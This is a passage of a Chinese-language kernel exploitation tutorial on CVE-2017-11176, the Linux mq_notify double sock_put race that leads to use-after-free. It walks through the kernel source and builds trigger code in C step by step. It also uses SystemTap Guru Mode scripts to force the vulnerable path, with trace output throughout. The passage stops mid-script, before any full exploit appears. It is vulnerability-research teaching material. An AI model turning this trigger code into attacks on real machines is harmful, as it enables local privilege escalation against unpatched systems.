sock = netlink_getsockbyfilp(filp);[2b] fput(filp); if (IS_ERR(sock)) &#123; ret = PTR_ERR(sock); sock = NULL;[3] goto out; &#125; timeo = MAX_SCHEDULE_TIMEOUT;[4] ret = netlink_attachskb(sock, nc, &amp;timeo, NULL); if (ret == 1)[5a] goto retry; if (ret) &#123; sock = NULL; nc = NULL;[5b] goto out; &#125;[5c] // ... cut (normal path) ... out: if (sock) &#123; netlink_detachskb(sock, nc); &#125; else if (nc) &#123; dev_kfree_skb(nc); &#125; return ret; &#125; 代码开始于获取用户态提供的文件描述符[0]，如果这个fd不存在于当前进程的fdt中，将会返回空指针并进入退出流程[1]。此外，提供的文件的sock对象也被获取[2a]。如果没有有效的sock对象，同样会置NULL并进入退出流程[3]。在这两种情况下(?)，file结构体引用会被减一(dropped)[2b]。 最后，会调用netlink_attachskb()[4]，尝试将sk_buff(nc)加入到sock的接收队列，在这有三种可能的结果： 一切正常[5c] 函数返回1，代码跳转到retry标签[5a] nc和sock都被设置为NULL，代码跳转到退出流程[5b] 为什么要清空sock指针1234out: if (sock) &#123; netlink_detachskb(sock, nc); // &lt;----- here &#125; 1234567// from [net/netlink/af_netlink.c]void netlink_detachskb(struct sock *sk, struct sk_buff *skb)&#123; kfree_skb(skb); sock_put(sk); // &lt;----- here&#125; 12345678// from [include/net/sock.h]/* Ungrab socket and destroy it if it was the last reference. */static inline void sock_put(struct sock *sk)&#123; if (atomic_dec_and_test(&amp;sk-&gt;sk_refcnt)) // &lt;----- here sk_free(sk);&#125; 如果sock被置NULL并进入退出流程，它的引用计数器sk_refcnt无条件地会被减1。如patch所描述的，漏洞代码的sock对象的refcount存在着问题，但refcount是在何处被加1的？查看netlink_getsockbyfilp()[2a]： 1234567891011121314151617 // from [net/netlink/af_netlink.c] struct sock *netlink_getsockbyfilp(struct file *filp) &#123; struct inode *inode = filp-&gt;f_path.dentry-&gt;d_inode; struct sock *sock; if (!S_ISSOCK(inode-&gt;i_mode)) return ERR_PTR(-ENOTSOCK); sock = SOCKET_I(inode)-&gt;sk; if (sock-&gt;sk_family != AF_NETLINK) return ERR_PTR(-EINVAL);[0] sock_hold(sock); // &lt;----- here return sock; &#125; 123456// from [include/net/sock.h]static inline void sock_hold(struct sock *sk)&#123; atomic_inc(&amp;sk-&gt;sk_refcnt); // &lt;------ here&#125; sock对象的refcounter在[0]处被增加，计数器无条件地被netlink_getsockbyfilp()加一，被netlink_detachskb()（如果sock非空）减一，这意味着netlink_attachskb()应该以某种形式对refcounter保持中立。（attach的调用位于另外两个函数中间） 简化版的netlink_attachskb()代码： 1234567891011121314151617181920212223242526272829303132333435// from [net/netlink/af_netlink.c]/* * Attach a skb to a netlink socket. * The caller must hold a reference to the destination socket. On error, the * reference is dropped. The skb is not sent to the destination, just all * all error checks are performed and memory in the queue is reserved. * Return values: * &lt; 0: error. skb freed, reference to sock dropped. * 0: continue * 1: repeat lookup - reference dropped while waiting for socket memory. */int netlink_attachskb(struct sock *sk, struct sk_buff *skb, long *timeo, struct sock *ssk)&#123; struct netlink_sock *nlk; nlk = nlk_sk(sk); if (atomic_read(&amp;sk-&gt;sk_rmem_alloc) &gt; sk-&gt;sk_rcvbuf || test_bit(0, &amp;nlk-&gt;state)) &#123; // ... cut (wait until some conditions) ... sock_put(sk); // &lt;----- refcnt decremented here if (signal_pending(current)) &#123; kfree_skb(skb); return sock_intr_errno(*timeo); // &lt;----- "error" path &#125; return 1; // &lt;----- "retry" path &#125; skb_set_owner_r(skb, sk); // &lt;----- "normal" path return 0;&#125; netlink_attachskb()有两条路径： 正常路径：skb拥有权转到sock（例如加入到sock的接收队列中） Socket的接收缓冲区已满：等待直到有足够的空间并重试，或退出 如注释所言：调用者必须持有对目标套接字的引用(?)。 出错时，refcounter会被减1，因此netlink_attachskb对sock的refcounter有副作用。 既然netlink_attachskb可能释放refcounter，调用者应该确保它不能被释放第二次，这个由将sock设置为NULL实现。在错误路径中sock被正确处理了，但在retry中并没有。 至此，我们知道了错误发生的情况，即retry逻辑中没有正确重置sock为NULL。 条件竞争Patch中提到了与已经关闭的fd相关的条件竞争窗口，首先来看下retry逻辑的起始位置： 12345678sock = NULL; // &lt;----- first loop onlyretry: filp = fget(notification.sigev_signo); if (!filp) &#123; ret = -EBADF; goto out; // &lt;----- what about this? &#125; sock = netlink_getsockbyfilp(filp); 在第一次循环的时候，错误处理路径看起来似乎是无害的，但是要记住，在第二次循环的时候（goto retry之后），sock已经不是NULL了，并且refcounter已经被减1。所以，直接跳到out，满足了第一个条件： 1234out: if (sock) &#123; netlink_detachskb(sock, nc); &#125; sock在这被减1了第二次（double sock_put() bug）。可能会疑惑为什么会在第二次循环中触发这个条件（fgets返回NULL），这就是这个漏洞的条件竞争部分，会在下一章说明。 攻击场景 close系统调用触发fputs()（对refcounter减1）并从映射表中将fd和文件的映射移除，将fdt[TARGET_FD]的入口设置为NULL。因为调用close(fd)函数将会释放最后一个对文件的引用，所以file结构体将会被释放。由于file结构体被释放，相关联的sock的结构体的引用计数被减1，且sock的计数为0，导致它被释放。这时，sock指针并没有被设置为NULL，使其成为了一个野指针。 因为fd已经不指向任何有效的文件结构了，所以第二次调用fget()时会失败，程序将会跳转到out标签处。接着netlink_detachskb()将会使用之前已经被释放的sock指针，导致use after free。这里的use after free是漏洞导致的结果而不是漏洞产生的原因。 这就是为什么patch提到了关闭fd，这是触发漏洞的必要条件。并且因为close()发生在其它线程中的特定时间，所以产生了竞争条件。 到此为止，我们知道了关于漏洞的所有知识以及如何触发它，需要明确两个条件： 在第一个retry中，netlink_attachskb()应该返回1 在第二个retry中，fget()应该返回NULL 换句话说，当我们从mq_notify()系统调用返回时，sock的refcounter已经被减去了1，这里出现了失衡。因为refcounter在进入系统调用之前是1，当它释放后，在netlink_detachskb()中又被使用。 0x04 如何到达retry逻辑在之前的章节中，我们分析了漏洞及其触发的条件，在这个章节，我们将会探究如何到达漏洞代码处并编写exp。事实上，确认bug是否能被利用是第一要务，如果无法到达相应的代码处，也就没有继续研究的必要了。 分析retry之前的代码如同大多数系统调用一样，mq_notift一开始也调用copy_from_user()函数从用户态读取数据： 123456789101112131415161718 SYSCALL_DEFINE2(mq_notify, mqd_t, mqdes, const struct sigevent __user *, u_notification) &#123; int ret; struct file *filp; struct sock *sock; struct inode *inode; struct sigevent notification; struct mqueue_inode_info *info; struct sk_buff *nc;[0] if (u_notification) &#123;[1] if (copy_from_user(&amp;notification, u_notification, sizeof(struct sigevent))) return -EFAULT; &#125; audit_mq_notify(mqdes, u_notification ? &amp;notification : NULL); // &lt;--- you can ignore this 代码在[0]处检查u_notification是否被设置为NULL，在[1]处从用户态拷贝数据到notification。接下来，可以看到一系列基于用户态数据中的sigevent结构体的检查： 123456789101112131415161718192021222324252627282930313233 nc = NULL; sock = NULL;[2] if (u_notification != NULL) &#123;[3a] if (unlikely(notification.sigev_notify != SIGEV_NONE &amp;&amp; notification.sigev_notify != SIGEV_SIGNAL &amp;&amp; notification.sigev_notify != SIGEV_THREAD)) return -EINVAL;[3b] if (notification.sigev_notify == SIGEV_SIGNAL &amp;&amp; !valid_signal(notification.sigev_signo)) &#123; return -EINVAL; &#125;[3c] if (notification.sigev_notify == SIGEV_THREAD) &#123; long timeo; /* create the notify skb */ nc = alloc_skb(NOTIFY_COOKIE_LEN, GFP_KERNEL); if (!nc) &#123; ret = -ENOMEM; goto out; &#125;[4] if (copy_from_user(nc-&gt;data, notification.sigev_value.sival_ptr, NOTIFY_COOKIE_LEN)) &#123; ret = -EFAULT; goto out; &#125; /* TODO: add a header? */ skb_put(nc, NOTIFY_COOKIE_LEN); /* and attach it to the socket */ retry: // &lt;---- we want to reach this! filp = fget(notification.sigev_signo); 如果[2]处非NULL，sigev_notify的值会在[3a] [3b] [3c]检查三遍。另一次copy_from_user()在[4]处根据notification.sigev_value_sival_ptr的值触发，需要指向一个用户空间中有效的、可读取的区域的指针，否则函数调用会失败。 sigevent声明如下： 123456789101112131415161718192021// [include/asm-generic/siginfo.h]typedef union sigval &#123; int sival_int; void __user *sival_ptr;&#125; sigval_t;typedef struct sigevent &#123; sigval_t sigev_value; int sigev_signo; int sigev_notify; union &#123; int _pad[SIGEV_PAD_SIZE]; int _tid; struct &#123; void (*_function)(sigval_t); void *_attribute; /* really pthread_attr_t */ &#125; _sigev_thread; &#125; _sigev_un;&#125; sigevent_t; 为了进入retry至少一次，我们需要： 提供一个非空的u_notification参数 将u_notification.sigev_notify设置为SIGEV_THREAD notification.sigev_value.sival_ptr必须是一个合法的用户空间可读指针，数据长度至少32字节(NOTIFY_COOKIE_LEN=32)。 开始编写exploitation先编写一个exp验证mq_notify可用。 123456789101112131415161718192021222324252627282930313233343536373839/* * CVE-2017-11176 Exploit. */#include &lt;mqueue.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;#define NOTIFY_COOKIE_LEN (32)int main(void)&#123; struct sigevent sigev; char sival_buffer[NOTIFY_COOKIE_LEN]; printf("-=&#123; CVE-2017-11176 Exploit &#125;=-\n"); // initialize the sigevent structure memset(&amp;sigev, 0, sizeof(sigev)); sigev.sigev_notify = SIGEV_THREAD; sigev.sigev_value.sival_ptr = sival_buffer; if (mq_notify((mqd_t)-1, &amp;sigev)) &#123; perror("mqnotify"); goto fail; &#125; printf("mqnotify succeed\n"); // TODO: exploit return 0;fail: printf("exploit failed!\n"); return -1;&#125; 推荐使用Makefile来降低exp的开发难度。为了编译这段代码，需要使用-lrt标志（调用mq_notify所必需的）。另外，推荐使用-O0优化选项避免gcc重排我们的代码导致不可预料的问题。 123-=&#123; CVE-2017-11176 Exploit &#125;=-mqnotify: Bad file descriptorexploit failed! mq_notify返回了Bad file descriptor（-EBADF），有三个地方会导致该错误： fget()的某次调用 filp-&gt;f_op != &amp;mqueue_file_operations的检查 让我们找出具体是什么位置。 System Tap在exp开发的初始阶段，强烈建议在带调试符号的kernel中运行exp，这将使得我们可以使用SystemTap。SystemTap是一个内核探针工具，并且不需要使用gdb。 让我们从一个基本的System Tap脚本开始： 1234567891011121314151617# mq_notify.stpprobe syscall.mq_notify&#123; if (execname() == "exploit") &#123; printf("\n\n(%d-%d) &gt;&gt;&gt; mq_notify (%s)\n", pid(), tid(), argstr) &#125;&#125;probe syscall.mq_notify.return&#123; if (execname() == "exploit") &#123; printf("(%d-%d) &lt;&lt;&lt; mq_notify = %x\n\n\n", pid(), tid(), $return) &#125;&#125; 前述脚本安装的两个探针分别位于系统调用之前和之后，使用execname()来限制输出的条件。 备注：如果输出太多，SystemTap会忽略一些输出并且不会提示。 运行脚本： 1stap -v mq_notify.stp 再次运行exp将会显示： 12(14427-14427) &gt;&gt;&gt; mq_notify (-1, 0x7ffdd7421400)(14427-14427) &lt;&lt;&lt; mq_notify = fffffffffffffff7 探针正常工作，-1是我们设置的第一个参数，第二个参数是一个用户态指针，返回值-9即-EBADF。接下来添加新的输出，不同于syscall的hook，一般的内核函数可以通过下列写法来实现hook： 1234567probe kernel.function ("fget")&#123; if (execname() == "exploit") &#123; printf("(%d-%d) [vfs] ==&gt;&gt; fget (%s)\n", pid(), tid(), $$parms) &#125;&#125; 备注：由于某些原因，并不是所有内核函数都可以被hook。例如一些内联函数，需要根据其具体的位置判断其是否能被hook。另外，像copy_from_user()这种函数，可以在调用前被hook，调用后不能被hook。SystemTap会提示和拒绝这些hook。 接着我们对mq_notify()中的每一个函数都添加了探针并重新运行exp： 1234567891011121314151617(17850-17850) [SYSCALL] ==&gt;&gt; mq_notify (-1, 0x7ffc30916f50)(17850-17850) [uland] ==&gt;&gt; copy_from_user ()(17850-17850) [skb] ==&gt;&gt; alloc_skb (priority=0xd0 size=0x20)(17850-17850) [uland] ==&gt;&gt; copy_from_user ()(17850-17850) [skb] ==&gt;&gt; skb_put (skb=0xffff88002e061200 len=0x20)(17850-17850) [skb] &lt;&lt;== skb_put = ffff88000a187600(17850-17850) [vfs] ==&gt;&gt; fget (fd=0x3)(17850-17850) [vfs] &lt;&lt;== fget = ffff88002e271280(17850-17850) [netlink] ==&gt;&gt; netlink_getsockbyfilp (filp=0xffff88002e271280)(17850-17850) [netlink] &lt;&lt;== netlink_getsockbyfilp = ffff88002ff82800(17850-17850) [netlink] ==&gt;&gt; netlink_attachskb (sk=0xffff88002ff82800 skb=0xffff88002e061200 timeo=0xffff88002e1f3f40 ssk=0x0)(17850-17850) [netlink] &lt;&lt;== netlink_attachskb = 0(17850-17850) [vfs] ==&gt;&gt; fget (fd=0xffffffff)(17850-17850) [vfs] &lt;&lt;== fget = 0(17850-17850) [netlink] ==&gt;&gt; netlink_detachskb (sk=0xffff88002ff82800 skb=0xffff88002e061200)(17850-17850) [netlink] &lt;&lt;== netlink_detachskb(17850-17850) [SYSCALL] &lt;&lt;== mq_notify= -9 First Bug本地测试的输出： 123456789101112131415161718192021222324252627282930Pass 1: parsed user script and 106 library script(s) using 87868virt/32748res/5356shr/28164data kb, in 90usr/0sys/92real ms.Pass 2: analyzed script: 593 probe(s), 12 function(s), 5 embed(s), 0 global(s) using 147776virt/93816res/6848shr/88072data kb, in 830usr/60sys/896real ms.Pass 3: using cached /root/.systemtap/cache/c1/stap_c16be11687935a62b4012a183645f89c_205765.cPass 4: using cached /root/.systemtap/cache/c1/stap_c16be11687935a62b4012a183645f89c_205765.koPass 5: starting run.(2521-2521) &gt;&gt;&gt; copy_from_user()(2521-2521) &gt;&gt;&gt; copy_from_user()(2521-2521) &gt;&gt;&gt; copy_from_user()(2521-2521) &gt;&gt;&gt; copy_from_user()(2521-2521) &gt;&gt;&gt; copy_from_user()(2521-2521) &gt;&gt;&gt; copy_from_user()(2521-2521) &gt;&gt;&gt; mq_notify (-1, 0x7fffd32050e0)(2521-2521) &gt;&gt;&gt; copy_from_user()(2521-2521) &gt;&gt;&gt; alloc_skb (priority=? size=?)(2521-2521) &gt;&gt;&gt; copy_from_user()(2521-2521) &gt;&gt;&gt; fdget (fd=?)(2521-2521) &gt;&gt;&gt; netlink_getsockbyfilp (filp=0xffff88003c4ff100)(2521-2521) &lt;&lt;&lt; netlink_getsockbyfilp = ffff88003c7b2000(2521-2521) &gt;&gt;&gt; netlink_attachskb (sk=0xffff88003c7b2000 skb=0xffff88003afd0100 timeo=0xffff88003c6c3f08 ssk=0x0)(2521-2521) &lt;&lt;&lt; netlink_attachskb = 0(2521-2521) &gt;&gt;&gt; fdget (fd=?)(2521-2521) &gt;&gt;&gt; netlink_detachskb (sk=0xffff88003c7b2000 skb=0xffff88003afd0100)(2521-2521) &lt;&lt;&lt; netlink_detachskb(2521-2521) &lt;&lt;&lt; mq_notify = fffffffffffffff7(2521-2521) &gt;&gt;&gt; copy_from_user()(2521-2521) &gt;&gt;&gt; copy_from_user() 看起来我们似乎到达了retry逻辑： copy_from_user调用 alloc_skb调用：exp传递了SIGEV_THREAD copy_from_user调用：获取sival_buffer skb_put调用：表明了第三步没有失败 fdget(fd=?)：在作者原文中，fd=0x3 作者原文中提到，fd应该为0，因为notification.sigev_signo没有传递其它值。尽管如此，第一个fget()并没有失败，另外netlink_getsockbyfilp()和netlink_attachskb()也正常工作。这些事有些奇怪因为我们并没有创建任何AF_NETLINK socket。 第二个fget()失败是因为我们通过mq_notify的参数设置了fd为-1，问题在哪？让我们回过头检查一下sigevent指针。 12printf("sigev = 0x%p\n", &amp;sigev);if (mq_notify((mqd_t) -1, &amp;sigev)) 12sigev = 0x0x7fffbca93010(2566-2566) &gt;&gt;&gt; mq_notify (-1, 0x7fffbca92f90) 显然系统调用所接收到的指针(0x7fffbca92f90)和我们所提供的(0x0x7fffbca93010)并不完全相同，这可能因为SystemTap有bug或者库的wrapper。 修改exp： 12345678910111213141516171819202122232425262728293031323334#define _GNU_SOURCE#include &lt;unistd.h&gt;#include &lt;sys/syscall.h&gt;#define _mq_notify(mqdes, sevp) syscall(__NR_mq_notify, mqdes, sevp)#include &lt;mqueue.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;#define NOTIFY_COOKIE_LEN (32)int main(void) &#123; struct sigevent sigev; char sival_buffer[NOTIFY_COOKIE_LEN]; printf("CVE-2017-11176 Exploit\n"); printf("sigev = 0x%p\n", &amp;sigev); memset(&amp;sigev, 0, sizeof(sigev)); sigev.sigev_signo = -1; sigev.sigev_notify = SIGEV_THREAD; sigev.sigev_value.sival_ptr = sival_buffer; if (_mq_notify((mqd_t)-1, &amp;sigev)) &#123; perror("mqnotify"); goto fail; &#125; printf("mqnotify succeed\n"); // TODO return 0;fail: printf("Exploit Failed\n"); return -1;&#125; 因为直接使用了系统调用，编译时不需要再使用-lrt选项了。新的结果如下： 12sigev = 0x0x7fffe677a630(2599-2599) &gt;&gt;&gt; mq_notify (4294967295, 0x7fffe677a630) 12345678(3198-3198) &gt;&gt;&gt; mq_notify (4294967295, 0x7fffeda9b070)(3198-3198) &gt;&gt;&gt; copy_from_user()(3198-3198) &gt;&gt;&gt; alloc_skb (priority=? size=?)(3198-3198) &gt;&gt;&gt; copy_from_user()(3198-3198) &gt;&gt;&gt; skb_put (skb=0xffff88003af5d200 len=0x20)(3198-3198) &lt;&lt;&lt; skb_put = ffff88003aec5000(3198-3198) &gt;&gt;&gt; fdget (fd=?)(3198-3198) &lt;&lt;&lt; mq_notify = fffffffffffffff7 当第一次fget()失败后，程序如我们所期望的直接走到了out标签。到此为止，我们知道了我们可以绕过安全检查到达retry标签。 A common trap has been exposed (caused by library wrapper(封装) instead of syscall), and we saw how to fix it. In order to avoid the same kind of bug in the future, we will wrap every syscall. 0x05 强制触发有些时候你想验证一个想法又不想从头先搞明白相关的所有代码，在这种情况下，可以使用System Tap Guru Mode来修改内核的数据结构来强制内核执行特定的路径。换句话说，我们可以在内核态去触发漏洞，如果我们在内核态都无法触发漏洞，就更不用说从用户态去触发了。所以，先分析如何修改内核相关参数来满足漏洞触发条件，再逐步去实现用户态的exp(Part 2)。 我们可以触发漏洞如果： 到达retry逻辑（循环回retry）。我们需要进入netlink_attachskb()并返回1，sock的计数器会减去1。 当返回retry时，下一次fget()必须返回空以进入out路径并使得sock的计数器再减1。 到达netlink_attachskb()在前述中，为了触发漏洞，我们必须让netlink_attachskb()返回1，在调用它之前，我们还需先满足几个条件： 提供一个有效的fd避免第一次fget()执行失败 fd指向的文件必须是AF_NETLINK类型的sock 这样就可以通过检查： 12345678910111213 retry:[0] filp = fget(notification.sigev_signo); if (!filp) &#123; ret = -EBADF; goto out; &#125;[1] sock = netlink_getsockbyfilp(filp); fput(filp); if (IS_ERR(sock)) &#123; ret = PTR_ERR(sock); sock = NULL; goto out; &#125; 通过[0]处的第一个检查比较简单，提供了有效的fd即可，但最好还是提供一个合适的fd，否则[1]处的检查可能会失败： 123456789101112131415struct sock *netlink_getsockbyfilp(struct file *filp)&#123; struct inode *inode = filp-&gt;f_path.dentry-&gt;d_inode; struct sock *sock; if (!S_ISSOCK(inode-&gt;i_mode)) // &lt;--- this need to be a socket... return ERR_PTR(-ENOTSOCK); sock = SOCKET_I(inode)-&gt;sk; if (sock-&gt;sk_family != AF_NETLINK) // &lt;--- ...from the AF_NETLINK family return ERR_PTR(-EINVAL); sock_hold(sock); return sock;&#125; exp改为： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455/* * CVE-2017-11176 Exploit. */#define _GNU_SOURCE#include &lt;mqueue.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/socket.h&gt;#include &lt;linux/netlink.h&gt;#define NOTIFY_COOKIE_LEN (32)#define _mq_notify(mqdes, sevp) syscall(__NR_mq_notify, mqdes, sevp)#define _socket(domain, type, protocol) syscall(__NR_socket, domain, type, protocol)int main(void)&#123; struct sigevent sigev; char sival_buffer[NOTIFY_COOKIE_LEN]; int sock_fd; printf("-=&#123; CVE-2017-11176 Exploit &#125;=-\n"); if ((sock_fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_GENERIC)) &lt; 0) &#123; perror("socket"); goto fail; &#125; printf("netlink socket created = %d\n", sock_fd); // initialize the sigevent structure memset(&amp;sigev, 0, sizeof(sigev)); sigev.sigev_notify = SIGEV_THREAD; sigev.sigev_value.sival_ptr = sival_buffer; sigev.sigev_signo = sock_fd; // &lt;--- not '-1' anymore if (_mq_notify((mqd_t)-1, &amp;sigev)) &#123; perror("mq_notify"); goto fail; &#125; printf("mq_notify succeed\n"); // TODO: exploit return 0;fail: printf("exploit failed!\n"); return -1;&#125; 运行结果： 123456789101112131415(3566-3566) &gt;&gt;&gt; mq_notify (4294967295, 0x7ffebfc52b20)(3566-3566) &gt;&gt;&gt; copy_from_user()(3566-3566) &gt;&gt;&gt; alloc_skb (priority=? size=?)(3566-3566) &gt;&gt;&gt; copy_from_user()(3566-3566) &gt;&gt;&gt; skb_put (skb=0xffff88003afcd700 len=0x20)(3566-3566) &lt;&lt;&lt; skb_put = ffff88003afc8000(3566-3566) &gt;&gt;&gt; fdget (fd=?)(3566-3566) &gt;&gt;&gt; netlink_getsockbyfilp (filp=0xffff88003c7abc00)(3566-3566) &lt;&lt;&lt; netlink_getsockbyfilp = ffff88003c7ac800 &lt;==== Pass(3566-3566) &gt;&gt;&gt; netlink_attachskb (sk=0xffff88003c7ac800 skb=0xffff88003afcd700 timeo=0xffff88003c643f08 ssk=0x0)(3566-3566) &lt;&lt;&lt; netlink_attachskb = 0 &lt;==== Unwanted behavior(3566-3566) &gt;&gt;&gt; fdget (fd=?)(3566-3566) &gt;&gt;&gt; netlink_detachskb (sk=0xffff88003c7ac800 skb=0xffff88003afcd700)(3566-3566) &lt;&lt;&lt; netlink_detachskb(3566-3566) &lt;&lt;&lt; mq_notify = fffffffffffffff7 fget()和netlink_getsockbyfilp()看起来都正常执行，且我们可以控制关键数据并到达netlink_attachskb()处。 强制netlink_attachskb()进入retry在前面的exp中，我们可以到达netlink_attachskb()但它返回了0，使得代码运行了非我们所愿的normal路径。回头看一下内核代码： 123456789101112131415161718192021222324252627282930313233 int netlink_attachskb(struct sock *sk, struct sk_buff *skb, long *timeo, struct sock *ssk) &#123; struct netlink_sock *nlk; nlk = nlk_sk(sk);[0] if (atomic_read(&amp;sk-&gt;sk_rmem_alloc) &gt; sk-&gt;sk_rcvbuf || test_bit(0, &amp;nlk-&gt;state)) &#123; DECLARE_WAITQUEUE(wait, current); if (!*timeo) &#123; // ... cut (never reached in our code path) ... &#125; __set_current_state(TASK_INTERRUPTIBLE); add_wait_queue(&amp;nlk-&gt;wait, &amp;wait); if ((atomic_read(&amp;sk-&gt;sk_rmem_alloc) &gt; sk-&gt;sk_rcvbuf || test_bit(0, &amp;nlk-&gt;state)) &amp;&amp; !sock_flag(sk, SOCK_DEAD)) *timeo = schedule_timeout(*timeo); __set_current_state(TASK_RUNNING); remove_wait_queue(&amp;nlk-&gt;wait, &amp;wait); sock_put(sk); if (signal_pending(current)) &#123; kfree_skb(skb); return sock_intr_errno(*timeo); &#125; return 1; // &lt;---- the only way &#125; skb_set_owner_r(skb, sk); return 0; &#125; 想让netlink_attachskb()返回1只有一条途径，并且首先需要满足[0]处的判断： 1if (atomic_read(&amp;sk-&gt;sk_rmem_alloc) &gt; sk-&gt;sk_rcvbuf || test_bit(0, &amp;nlk-&gt;state)) 为了强行满足该条件，就需要使用SystemTap的Guru Mode。在Guru Mode下，可以让我们的探针去调用我们所编写的代码，就如同直接向内核中注入代码一样。因此任何错误都会导致内核崩溃。 我们接下来要做的就是修改sock结构体sk和netlink_sock结构体nlk来使得if判断为True，在此之前，先收集一些sk的信息： 123456789101112131415161718192021222324252627282930%&#123;#include &lt;net/sock.h&gt;#include &lt;net/netlink_sock.h&gt;%&#125;function dump_netlink_sock:long (arg_sock:long)%&#123; struct sock *sk = (void*) STAP_ARG_arg_sock; struct netlink_sock *nlk = (void*) sk; _stp_printf("-=&#123; dump_netlink_sock: %p &#125;=-\n", nlk); _stp_printf("- sk = %p\n", sk); _stp_printf("- sk-&gt;sk_rmem_alloc = %d\n", sk-&gt;sk_rmem_alloc); _stp_printf("- sk-&gt;sk_rcvbuf = %d\n", sk-&gt;sk_rcvbuf); _stp_printf("- sk-&gt;sk_refcnt = %d\n", sk-&gt;sk_refcnt); _stp_printf("- nlk-&gt;state = %x\n", (nlk-&gt;state &amp; 0x1)); _stp_printf("-=&#123; dump_netlink_sock: END&#125;=-\n");%&#125;probe kernel.function ("netlink_attachskb")&#123; if (execname() == "exploit") &#123; printf("(%d-%d) [netlink] ==&gt;&gt; netlink_attachskb (%s)\n", pid(), tid(), $$parms) dump_netlink_sock($sk); &#125;&#125; 使用-g选项加载stap脚本： 12345678910111213141516171819202122(3299-3299) &gt;&gt;&gt; mq_notify (4294967295, 0x7fff6bb3ac10)(3299-3299) &gt;&gt;&gt; copy_from_user()(3299-3299) &gt;&gt;&gt; alloc_skb (priority=? size=?)(3299-3299) &gt;&gt;&gt; copy_from_user()(3299-3299) &gt;&gt;&gt; skb_put (skb=0xffff88003d464d00 len=0x20)(3299-3299) &lt;&lt;&lt; skb_put = ffff88003add2000(3299-3299) &gt;&gt;&gt; __fdget (fd=0x3)(3299-3299) &gt;&gt;&gt; netlink_getsockbyfilp (filp=0xffff88001b895900)(3299-3299) &lt;&lt;&lt; netlink_getsockbyfilp = ffff88001b875000(3299-3299) &gt;&gt;&gt; netlink_attachskb (sk=0xffff88001b875000 skb=0xffff88003d464d00 timeo=0xffff880000053f08 ssk=0x0)-=&#123; dump_netlink_sock: 0xffff88001b875000 &#125;=-- sk = 0xffff88001b875000- sk-&gt;sk_rmem_alloc = 0- sk-&gt;sk_rcvbuf = 212992- sk-&gt;sk_refcnt = 2- nlk-&gt;state = 0-=&#123; dump_netlink_sock: END&#125;=-(3299-3299) &lt;&lt;&lt; netlink_attachskb = 0(3299-3299) &gt;&gt;&gt; __fdget (fd=0xffffffff)(3299-3299) &gt;&gt;&gt; netlink_detachskb (sk=0xffff88001b875000 skb=0xffff88003d464d00)(3299-3299) &lt;&lt;&lt; netlink_detachskb(3299-3299) &lt;&lt;&lt; mq_notify = fffffffffffffff7 如上述输出，nlk-&gt;state的第1bit为0且sk-&gt;sk_rmem_alloc小于sk-&gt;rcvbuf，所以if判断不会成立。接着，让我们在netlink_attachskb()调用之前修改数据： 1234567891011121314151617function dump_netlink_sock:long (arg_sock:long)%&#123; struct sock *sk = (void*) STAP_ARG_arg_sock; struct netlink_sock *nlk = (void*) sk; _stp_printf("-=&#123; dump_netlink_sock: %p &#125;=-\n", nlk); _stp_printf("- sk = %p\n", sk); _stp_printf("- sk-&gt;sk_rmem_alloc = %d\n", sk-&gt;sk_rmem_alloc); _stp_printf("- sk-&gt;sk_rcvbuf = %d\n", sk-&gt;sk_rcvbuf); _stp_printf("- sk-&gt;sk_refcnt = %d\n", sk-&gt;sk_refcnt); _stp_printf("- (before) nlk-&gt;state = %x\n", (nlk-&gt;state &amp; 0x1)); nlk-&gt;state |= 1; // &lt;----- _stp_printf("- (after) nlk-&gt;state = %x\n", (nlk-&gt;state &amp; 0x1)); _stp_printf("-=&#123; dump_netlink_sock: END&#125;=-\n");%&#125; 再次运行exp： 1234567891011121314151617181920(3629-3629) &gt;&gt;&gt; mq_notify (4294967295, 0x7ffc1507a6c0)(3629-3629) &gt;&gt;&gt; copy_from_user()(3629-3629) &gt;&gt;&gt; alloc_skb (priority=? size=?)(3629-3629) &gt;&gt;&gt; copy_from_user()(3629-3629) &gt;&gt;&gt; skb_put (skb=0xffff88003aec7c00 len=0x20)(3629-3629) &lt;&lt;&lt; skb_put = ffff88003ac79e00(3629-3629) &gt;&gt;&gt; __fdget (fd=0x3)(3629-3629) &gt;&gt;&gt; netlink_getsockbyfilp (filp=0xffff88003ae67b00)(3629-3629) &lt;&lt;&lt; netlink_getsockbyfilp = ffff88003bdf9000(3629-3629) &gt;&gt;&gt; netlink_attachskb (sk=0xffff88003bdf9000 skb=0xffff88003aec7c00 timeo=0xffff88003cb37f08 ssk=0x0)-=&#123; dump_netlink_sock: 0xffff88003bdf9000 &#125;=-- sk = 0xffff88003bdf9000- sk-&gt;sk_rmem_alloc = 0- sk-&gt;sk_rcvbuf = 212992- sk-&gt;sk_refcnt = 2- nlk-&gt;state = 0- (after) nlk-&gt;state = 1-=&#123; dump_netlink_sock: END&#125;=-(3629-3629) &lt;&lt;&lt; netlink_attachskb = fffffffffffffe00(3629-3629) &lt;&lt;&lt; mq_notify = fffffffffffffe00 在运行的过程中，exp会卡在系统调用中，CTRL-C即可。注意到netlink_attachskb()返回了0xfffffffffffffe00(-ERESTARTSYS)，代表我们进入了如下代码： 1234if (signal_pending(current)) &#123; kfree_skb(skb); return sock_intr_errno(*timeo); // &lt;---- return -ERESTARTSYS&#125; 这代表着我们成功地让netlink_attachskb()进入了其他路径。 避免exploit阻塞mq_notify()阻塞的原因： 1234567__set_current_state(TASK_INTERRUPTIBLE);if ((atomic_read(&amp;sk-&gt;sk_rmem_alloc) &gt; sk-&gt;sk_rcvbuf || test_bit(0, &amp;nlk-&gt;state)) &amp;&amp; !sock_flag(sk, SOCK_DEAD)) *timeo = schedule_timeout(*timeo);__set_current_state(TASK_RUNNING); 在第二章中我们会更深入的了解scheduling，现在主要是考虑为什么我们的exp会满足特定的条件并被阻塞。为了避免被阻塞，首先需要绕过schedule_timeout()，因此设置SOCK_DEAD，就是去修改sk的内容来让sock_flag()返回True： 12345678910// from [include/net/sock.h]static inline bool sock_flag(const struct sock *sk, enum sock_flags flag)&#123; return test_bit(flag, &amp;sk-&gt;sk_flags);&#125;enum sock_flags &#123; SOCK_DEAD, // &lt;---- this has to be '0', but we can check it with stap! ... cut ...&#125; 编辑stap脚本： 12345678910// mark it congested!_stp_printf("- 